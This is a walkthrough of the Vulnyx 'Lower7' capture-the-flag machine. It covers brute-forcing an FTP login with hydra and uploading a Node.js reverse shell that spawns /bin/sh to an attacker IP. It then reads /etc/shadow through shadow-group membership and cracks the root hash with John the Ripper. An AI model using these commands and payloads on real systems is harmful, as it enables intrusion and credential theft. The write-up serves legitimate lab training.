---
icon: linux
---

**Platform:** Vulnyx\
**Operating System:** Linux

> **Tags:** `Linux` `FTP` `Hydra` `Node.js` `Reverse Shell` `File Upload` `Shadow Group` `John the Ripper`

## INSTALLATION

We download the `zip` containing the `.ova` of the Lower7 machine, extract it, and import it into VirtualBox.

We configure the network interface of the Lower7 machine and run it alongside the attacker machine.

## HOST DISCOVERY

At this point, we still don’t know which `IP` address is assigned to Lower7, so we discover it as follows:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

Info:

```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts                                    
                                                                                                    
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                    
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor                                   
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor                                   
 10.0.4.3        08:00:27:96:84:20      1      60  PCS Systemtechnik GmbH                           
 10.0.4.37       08:00:27:b4:6a:f0      1      60  PCS Systemtechnik GmbH
```

We identify with high confidence that the victim’s IP is `10.0.4.37`.

## PORT SCANNING

Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.37
```

```bash
nmap -n -Pn -sCV -p21,3000 --min-rate 5000 10.0.4.37
```

Info:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 18:41 +0100
Nmap scan report for 10.0.4.37
Host is up (0.00018s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
3000/tcp open  http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 08:00:27:B4:6A:F0 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.13 seconds
```

We identify that ports `21` and `3000` are open.

We attempt to access the `FTP` service as `anonymous`, but the login fails. However, we see an interesting message:

```
Connected to 10.0.4.37.
220 "Hello a.clark, Welcome to your FTP server."
Name (10.0.4.37:trihack):
```

It welcomes us as `a.clark`, which suggests this might be the `username` for `FTP` access.

## BRUTE FORCE

We perform a `brute force` attack to see if we can find valid credentials for the user `a.clark`.

```bash
hydra -l a.clark -P /usr/share/wordlists/rockyou.txt 10.0.4.37 ftp -t 50
```

Info:

```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-05 18:48:57
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 50 tasks per 1 server, overall 50 tasks, 14344399 login tries (l:1/p:14344399), ~286888 tries per task
[DATA] attacking ftp://10.0.4.37:21/
[21][ftp] host: 10.0.4.37   login: a.clark   password: dragon
1 of 1 target successfully completed, 1 valid password found
```

We find the credentials: `a.clark` : `dragon`.

We log into the `FTP` service, but there are no files inside.

```
Connected to 10.0.4.37.
220 "Hello a.clark, Welcome to your FTP server."
Name (10.0.4.37:trihack): a.clark
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||10279|)
150 Here comes the directory listing.
drwxrwxrwx    2 1000     1000         4096 Oct 13 14:38 .
drwxrwxrwx    2 1000     1000         4096 Oct 13 14:38 ..
226 Directory send OK.
ftp>
```

Next, we check port `3000`, which is running a `HTTP` service based on `Node.js`.

![](../../images/nodejss.png)

The system tells us the page is working but currently has no content.

## REVERSE SHELL

We decide to upload a `.js` `reverse shell` via `FTP` and attempt to access it through port `3000`.

```bash
nano reverse.js
```

Code:

```js
module.exports = function() {
    var net = require("net");
    var cp = require("child_process");
    var sh = cp.spawn("/bin/sh", []);

    var client = new net.Socket();

    client.connect(4444, "10.0.4.12", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });

    return /a/;
};
```

We upload the `reverse shell` payload via FTP using the `PUT` command.

```
ftp> put reverse.js 
local: reverse.js remote: reverse.js
229 Entering Extended Passive Mode (|||13192|)
150 Ok to send data.
100% |********************************************************|   352        7.29 MiB/s    00:00 ETA
226 Transfer complete.
352 bytes sent in 00:00 (141.11 KiB/s)
ftp>
```

Before executing it, we set up a `listener` on our attacking machine, waiting to catch the connection.

```bash
sudo nc -nlvp 4444
```

Now, we navigate to the `reverse.js` file in the browser to execute it.

```
http://10.0.4.37:3000/reverse.js
```

Info:

```
listening on [any] 4444 ...
connect to [10.0.4.12] from (UNKNOWN) [10.0.4.37] 56148
whoami
a.clark
```

We receive the `shell` as user `a.clark`.

## TTY

Before attempting privilege escalation, we upgrade the `TTY` for a more interactive shell:

```bash
script /dev/null -c bash
```

`ctrl Z`

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

## PRIVILEGE ESCALATION

We perform some initial enumeration and discover that user `a.clark` is a member of the `shadow` group.

```
id
uid=1000(a.clark) gid=1000(a.clark) grupos=1000(a.clark),42(shadow)
```

Users in the `shadow` group can read the contents of the `/etc/shadow` file.

```bash
cat /etc/shadow
```

Info:

```
root:$y$j9T$9VFLJjKZix0Ugj9YsoOCSxxxxxxxxxxxx6z4oYqa7YD6QyXd52jxyLD:20374:0:99999:7:::
daemon:*:19676:0:99999:7:::
bin:*:19676:0:99999:7:::
sys:*:19676:0:99999:7:::
sync:*:19676:0:99999:7:::
games:*:19676:0:99999:7:::
man:*:19676:0:99999:7:::
lp:*:19676:0:99999:7:::
mail:*:19676:0:99999:7:::
news:*:19676:0:99999:7:::
uucp:*:19676:0:99999:7:::
proxy:*:19676:0:99999:7:::
www-data:*:19676:0:99999:7:::
backup:*:19676:0:99999:7:::
list:*:19676:0:99999:7:::
irc:*:19676:0:99999:7:::
_apt:*:19676:0:99999:7:::
nobody:*:19676:0:99999:7:::
systemd-network:!*:19676::::::
messagebus:!:19676::::::
sshd:!:19676::::::
a.clark:$y$j9T$bdXHrEdVSpm8nJ8xxxxxxxxxxqKaU08mhJoWKrnI9WdyUpZB:20374:0:99999:7:::
ftp:!:20374::::::
```

We retrieve the root user's `password hash` (in yescrypt format) and save it to a `hash.txt` file for cracking.

```
$y$j9T$9VFLJjKZix0Ugj9YsoOCS.xxxxxxxxxxRzEmwjcz6z4oYqa7YD6QyXd52jxyLD
```

```bash
john hash.txt --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bassman          (?)     
1g 0:00:02:36 DONE (2026-01-05 19:44) 0.006397g/s 107.4p/s 107.4c/s 107.4C/s ice-cream..yenifer
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We find the root password: `bassman`.

We escalate privileges to `root`.

```bash
su root
```

```
root@lower7:/home/a.clark# whoami
root
root@lower7:/home/a.clark#
```

Finally, we obtain the `user flag` and the `root flag`:

```
root@lower7:/home/a.clark# cat user.txt 
9f903b45d270a2d0b95c68b4f3aac03f
root@lower7:/home/a.clark# cat /root/root.txt 
97b79229372dea359415afef3e350241
```
